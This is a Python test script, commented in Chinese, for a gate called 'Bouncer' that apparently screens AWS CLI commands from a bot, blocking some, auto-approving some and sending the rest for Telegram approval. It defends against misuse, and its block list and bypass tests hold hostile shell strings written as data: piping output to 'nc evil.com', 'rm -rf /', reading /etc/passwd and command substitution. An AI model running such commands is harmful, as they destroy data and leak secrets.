"""
Bouncer 本地測試腳本
無需 AWS 權限，純邏輯驗證
"""

import sys
import json
import os
import time
import hmac as hmac_lib
import hashlib

# ============================================================================
# 從 app.py 複製核心邏輯（避免 boto3 依賴）
# ============================================================================

BLOCKED_PATTERNS = [
    'iam create', 'iam delete', 'iam attach', 'iam detach', 
    'iam put', 'iam update', 'iam add', 'iam remove',
    'sts assume-role',
    'organizations ',
    ';', '|', '&&', '||', '`', '$(', '${',
    'rm -rf', 'sudo ', '> /dev', 'chmod 777',
    'delete-account', 'close-account',
]

AUTO_APPROVE_PREFIXES = [
    'aws ec2 describe-',
    'aws s3 ls', 'aws s3api list-', 'aws s3api get-',
    'aws rds describe-',
    'aws lambda list-', 'aws lambda get-',
    'aws logs describe-', 'aws logs get-', 'aws logs filter-log-events',
    'aws cloudwatch describe-', 'aws cloudwatch get-', 'aws cloudwatch list-',
    'aws iam list-', 'aws iam get-',
    'aws sts get-caller-identity',
    'aws ssm describe-', 'aws ssm get-', 'aws ssm list-',
    'aws route53 list-', 'aws route53 get-',
    'aws ecs describe-', 'aws ecs list-',
    'aws eks describe-', 'aws eks list-',
]

def is_blocked(command: str) -> bool:
    cmd_lower = command.lower()
    return any(pattern in cmd_lower for pattern in BLOCKED_PATTERNS)

def is_auto_approve(command: str) -> bool:
    cmd_lower = command.lower()
    return any(cmd_lower.startswith(prefix) for prefix in AUTO_APPROVE_PREFIXES)

def verify_hmac(headers: dict, body: str, secret: str = 'test_secret') -> bool:
    timestamp = headers.get('x-timestamp', '')
    nonce = headers.get('x-nonce', '')
    signature = headers.get('x-signature', '')
    
    if not all([timestamp, nonce, signature]):
        return False
    
    try:
        ts = int(timestamp)
        if abs(time.time() - ts) > 300:
            return False
    except:
        return False
    
    payload = f"{timestamp}.{nonce}.{body}"
    expected = hmac_lib.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return hmac_lib.compare_digest(signature, expected)


# ============================================================================
# 測試函數
# ============================================================================

def test_command_classification():
    """測試命令分類邏輯"""
    print("\n" + "="*60)
    print("TEST 1: 命令分類")
    print("="*60)
    
    # BLOCKED 測試
    blocked_commands = [
        ('aws iam create-user --user-name hacker', True),
        ('aws sts assume-role --role-arn xxx', True),
        ('aws s3 ls; rm -rf /', True),
        ('aws ec2 describe-instances | cat /etc/passwd', True),
        ('aws organizations list-accounts', True),
        ('aws ec2 describe-instances', False),  # 這個不應該被 block
    ]
    
    print("\n[BLOCKED 測試]")
    passed = 0
    for cmd, should_block in blocked_commands:
        result = is_blocked(cmd)
        if result == should_block:
            status = "✅"
            passed += 1
        else:
            status = "❌"
        expected = "BLOCKED" if should_block else "ALLOWED"
        actual = "BLOCKED" if result else "ALLOWED"
        print(f"  {status} {cmd[:45]}... → {actual} (expected {expected})")
    print(f"  通過: {passed}/{len(blocked_commands)}")
    
    # SAFELIST 測試
    safe_commands = [
        ('aws ec2 describe-instances', True),
        ('aws s3 ls s3://my-bucket', True),
        ('aws sts get-caller-identity', True),
        ('aws logs filter-log-events --log-group xxx', True),
        ('aws iam list-users', True),
        ('aws ssm get-parameter --name /my/param', True),
        ('aws ec2 start-instances --instance-ids i-xxx', False),  # 這個需要審批
    ]
    
    print("\n[SAFELIST 測試]")
    passed = 0
    for cmd, should_auto in safe_commands:
        result = is_auto_approve(cmd)
        if result == should_auto:
            status = "✅"
            passed += 1
        else:
            status = "❌"
        expected = "AUTO" if should_auto else "APPROVAL"
        actual = "AUTO" if result else "APPROVAL"
        print(f"  {status} {cmd[:45]}... → {actual} (expected {expected})")
    print(f"  通過: {passed}/{len(safe_commands)}")
    
    return True


def test_security_bypass():
    """測試安全繞過嘗試"""
    print("\n" + "="*60)
    print("TEST 2: 安全繞過測試")
    print("="*60)
    
    bypass_attempts = [
        # Shell 注入
        ('aws s3 ls; cat /etc/passwd', 'Shell injection (;)'),
        ('aws s3 ls && rm -rf /', 'Shell injection (&&)'),
        ('aws s3 ls || echo pwned', 'Shell injection (||)'),
        ('aws s3 ls | nc evil.com 1234', 'Shell injection (|)'),
        ('aws s3 ls `whoami`', 'Command substitution (`)'),
        ('aws s3 ls $(id)', 'Command substitution ($())'),
        ('aws s3 ls ${HOME}', 'Variable expansion (${})'),
        
        # IAM 繞過嘗試
        ('aws iam create-role --role-name admin', 'IAM create'),
        ('aws iam attach-role-policy --role-name x', 'IAM attach'),
        ('AWS IAM CREATE-USER --user-name x', 'Case variation'),
        
        # 危險操作
        ('aws organizations create-account', 'Organizations'),
        ('sudo aws s3 ls', 'Sudo prefix'),
        ('aws s3 ls > /dev/null', 'Redirect to /dev'),
    ]
    
    print("\n[繞過嘗試 - 應該全部被擋]")
    passed = 0
    for cmd, description in bypass_attempts:
        result = is_blocked(cmd)
        if result:
            status = "✅ BLOCKED"
            passed += 1
        else:
            status = "❌ BYPASSED!"
        print(f"  {status}: {description}")
        print(f"           {cmd[:50]}")
    
    print(f"\n  通過: {passed}/{len(bypass_attempts)}")
    return passed == len(bypass_attempts)


def test_hmac_verification():
    """測試 HMAC 驗證"""
    print("\n" + "="*60)
    print("TEST 3: HMAC 簽章驗證")
    print("="*60)
    
    secret = 'test_secret_1234'
    body = '{"command": "aws s3 ls"}'
    
    # 正確簽章
    timestamp = str(int(time.time()))
    nonce = 'abc123'
    payload = f"{timestamp}.{nonce}.{body}"
    signature = hmac_lib.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
    
    headers = {'x-timestamp': timestamp, 'x-nonce': nonce, 'x-signature': signature}
    result = verify_hmac(headers, body, secret)
    print(f"  {'✅' if result else '❌'} 正確簽章: {'通過' if result else '失敗'}")
    
    # 錯誤簽章
    headers['x-signature'] = 'wrong_signature'
    result = verify_hmac(headers, body, secret)
    print(f"  {'✅' if not result else '❌'} 錯誤簽章: {'拒絕' if not result else '接受!'}")
    
    # 過期時間戳
    headers['x-timestamp'] = str(int(time.time()) - 600)
    headers['x-signature'] = signature
    result = verify_hmac(headers, body, secret)
    print(f"  {'✅' if not result else '❌'} 過期時間: {'拒絕' if not result else '接受!'}")
    
    # 缺少欄位
    result = verify_hmac({}, body, secret)
    print(f"  {'✅' if not result else '❌'} 缺少欄位: {'拒絕' if not result else '接受!'}")
    
    return True


def test_edge_cases():
    """測試邊界情況"""
    print("\n" + "="*60)
    print("TEST 4: 邊界情況")
    print("="*60)
    
    cases = [
        ('', False, False),  # 空字串
        ('   ', False, False),  # 只有空白
        ('aws', False, False),  # 不完整命令
        ('not aws command', False, False),  # 非 AWS 命令
        ('aws s3 ls' * 100, False, True),  # 超長命令（safelist）
    ]
    
    print("\n[邊界測試]")
    for cmd, exp_block, exp_auto in cases:
        blocked = is_blocked(cmd)
        auto = is_auto_approve(cmd)
        
        display = cmd[:40] + '...' if len(cmd) > 40 else cmd or '(empty)'
        print(f"  [{display}]")
        print(f"    blocked={blocked} (exp {exp_block}), auto={auto} (exp {exp_auto})")
    
    return True


def test_flow_simulation():
    """模擬完整請求流程（不需要 boto3）"""
    print("\n" + "="*60)
    print("TEST 5: 請求流程模擬")
    print("="*60)
    
    SECRET = 'test_secret_1234'
    
    def simulate_request(command, reason="test"):
        """模擬 handle_clawdbot_request 邏輯"""
        if is_blocked(command):
            return {'status': 'blocked', 'code': 403}
        
        if is_auto_approve(command):
            return {'status': 'auto_approved', 'code': 200, 'would_execute': command}
        
        return {'status': 'pending_approval', 'code': 202, 'would_send_telegram': True}
    
    test_cases = [
        ('aws iam create-user --user-name x', 'blocked', 403),
        ('aws s3 ls', 'auto_approved', 200),
        ('aws ec2 describe-instances', 'auto_approved', 200),
        ('aws ec2 start-instances --instance-ids i-xxx', 'pending_approval', 202),
        ('aws lambda update-function-code --function-name x', 'pending_approval', 202),
    ]
    
    print("\n[流程模擬]")
    passed = 0
    for cmd, exp_status, exp_code in test_cases:
        result = simulate_request(cmd)
        match = result['status'] == exp_status and result['code'] == exp_code
        if match:
            status = "✅"
            passed += 1
        else:
            status = "❌"
        print(f"  {status} {cmd[:45]}...")
        print(f"     → {result['status']} ({result['code']})")
    
    print(f"\n  通過: {passed}/{len(test_cases)}")
    return passed == len(test_cases)


def print_summary():
    """列出分類規則摘要"""
    print("\n" + "="*60)
    print("SUMMARY: 規則統計")
    print("="*60)
    
    print(f"\n  BLOCKED patterns: {len(BLOCKED_PATTERNS)}")
    print(f"  SAFELIST prefixes: {len(AUTO_APPROVE_PREFIXES)}")
    
    print("\n  覆蓋的 AWS 服務（SAFELIST）:")
    services = set()
    for prefix in AUTO_APPROVE_PREFIXES:
        parts = prefix.split()
        if len(parts) >= 2:
            services.add(parts[1])
    for svc in sorted(services):
        print(f"    - {svc}")


if __name__ == '__main__':
    print("🧪 Bouncer 本地驗證")
    print("純邏輯測試，無需 AWS 權限或 boto3")
    
    all_passed = True
    all_passed &= test_command_classification()
    all_passed &= test_security_bypass()
    all_passed &= test_hmac_verification()
    all_passed &= test_edge_cases()
    all_passed &= test_flow_simulation()
    print_summary()
    
    print("\n" + "="*60)
    if all_passed:
        print("✅ 所有測試通過！程式碼邏輯驗證完成。")
    else:
        print("❌ 有測試失敗，請檢查上方輸出。")
    print("="*60)
    print("\n📋 部署前 checklist:")
    print("  [ ] Telegram Bot Token")
    print("  [ ] REQUEST_SECRET")
    print("  [ ] TELEGRAM_WEBHOOK_SECRET")
    print("  [ ] AWS credentials for deployment")
